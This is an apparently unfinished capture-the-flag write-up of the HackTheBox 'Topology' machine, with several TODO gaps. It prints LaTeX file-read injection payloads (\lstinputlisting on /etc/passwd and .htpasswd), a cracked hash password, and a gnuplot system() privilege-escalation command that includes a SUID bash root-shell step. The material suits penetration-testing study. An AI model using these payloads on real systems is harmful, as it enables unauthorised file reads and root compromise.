# HackTheBox — Topology

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: latex-injection, hash-cracking, gnuplot](https://img.shields.io/badge/Tags-LaTeX%20Injection%20%7C%20Hash%20Cracking%20%7C%20gnuplot-orange)

> 🚧 **[partial — original had explicit `# add X section` TODOs; preserved structure and what's there]**

---

## Attack Chain at a Glance

```
nmap → topology.htb (Apache) + latex.topology.htb subdomain
   → LaTeX injection in equation renderer (\lstinputlisting) → arbitrary file read
   → read /var/www/dev/.htpasswd → vdaisley apr1 hash
   → john + rockyou → calculus20
   → SSH as vdaisley → user.txt
   → /opt/gnuplot/*.plt files run by root → drop rootFlag.plt with system() call → root
```

---

## Reconnaissance

### Nmap Scan

<details>
<summary>Click to expand</summary>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
```

</details>

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 — "Miskatonic University" page |

Add `topology.htb` to `/etc/hosts`.

### Directory Brute-Force

<details>
<summary>Click to expand</summary>

```
gobuster dir -u http://topology.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/images               (Status: 301)
/css                  (Status: 301)
/javascript           (Status: 301)
/portraits            (Status: 301)
```

</details>

### People & Email Addresses Found on Site

```
Professor Lilian Klein, PhD       lklein@topology.htb
                                  +1-202-555-0143
                                  Prof. Klein is currently on sabbatical leave.
Vajramani Daisley, PhD
Derek Abrahams, BEng
```

### Subdomain Enumeration

```bash
gobuster vhost -u topology.htb -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --append-domain
```

Discovered: **`latex.topology.htb`** → `http://latex.topology.htb/equation.php` (a LaTeX equation renderer).

> 🚧 **[gap from original]** — note in original: "add dnsrecon/subdomain enumeration for dev subdomain". A second subdomain (presumably `dev.topology.htb`) is referenced later but its discovery isn't documented here.

---

## Initial Foothold — LaTeX Injection

The `equation.php` endpoint renders user-supplied LaTeX. The `listings` package (`\lstinputlisting`) reads arbitrary files into the rendered output. Reference: <https://users.ece.utexas.edu/~garg/dist/listings.pdf>

Test payload:

```latex
$\lstinputlisting{/etc/passwd}$
```

This returns the contents of `/etc/passwd` rendered into the equation image.

---

## User Flag — Cracking vdaisley

Reading the `dev` vhost's `.htpasswd`:

```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

Crack with `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result: **`calculus20`**

```bash
ssh vdaisley@topology.htb
# password: calculus20
cat ~/user.txt
```

🚩 **User flag captured.**

> 🚧 **[gap]** — original had TODO: "write about what I am looking for and where, basic enumeration".

---

## Privilege Escalation — gnuplot system()

[gnuplot's `system` command](http://www.gnuplot.info/docs_4.2/node327.html) executes shell commands.

A scheduled root job presumably runs every `.plt` file in `/opt/gnuplot/`. Drop our own:

```bash
echo "system 'cat /root/root.txt > /tmp/root.txt'" > /opt/gnuplot/rootFlag.plt
```

After the next interval, `/tmp/root.txt` will contain the root flag (readable by anyone).

For a proper root shell, swap the `cat` for `chmod u+s /bin/bash`, then `bash -p`.

> 🚧 **[gap from original]** — TODO note: "add gnuplot section". The full enumeration that revealed `/opt/gnuplot/` was being polled isn't documented (almost certainly `pspy` or filesystem inspection of `/etc/cron.d/`).

---

## Root Flag

> 🚧 **[incomplete]** — actual flag value not preserved.

---

## Lessons Learned

> 🚧 **[incomplete]**. Candidate themes:
> - Subdomain enumeration is essential — the foothold subdomain (`latex.topology.htb`) was completely invisible from the main vhost.
> - LaTeX is a programming language with file I/O and shell capabilities; renderers that don't sandbox it are arbitrary-read at minimum and often arbitrary-exec.
> - Plot/data-analysis tools (gnuplot, R, ggplot, Mathematica) routinely have `system()` or equivalent hooks. If you can drop a script that gets executed, you have RCE.
> - Apache 2.4.41 with custom-named vhosts almost always has at least one separate `.htpasswd` file worth reading.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [`gobuster`](https://github.com/OJ/gobuster) | Directory and vhost brute-forcing |
| [`john`](https://www.openwall.com/john/) | Cracking the apr1 hash |
| [LaTeX `listings` package](https://users.ece.utexas.edu/~garg/dist/listings.pdf) | `\lstinputlisting` arbitrary file read primitive |
| [gnuplot `system`](http://www.gnuplot.info/docs_4.2/node327.html) | Privesc via plot script execution |
